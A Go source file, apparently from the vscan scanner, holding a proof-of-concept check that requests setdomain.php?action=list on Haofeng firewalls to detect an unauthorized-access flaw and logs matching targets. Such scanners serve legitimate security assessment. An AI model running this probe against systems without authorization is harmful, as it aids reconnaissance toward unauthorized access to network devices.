package haofeng

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//皓峰防火墙 setdomain.php 越权访问漏洞

func Setdomain(u string) bool {
	if req, err := pkg.HttpRequset(u+"/setdomain.php?action=list", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "setdomain.php") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln 皓峰防火墙 setdomain.php 越权访问漏洞 |%s\n", u+"/setdomain.php?action=list"))
			return true
		}
	}
	return false
}
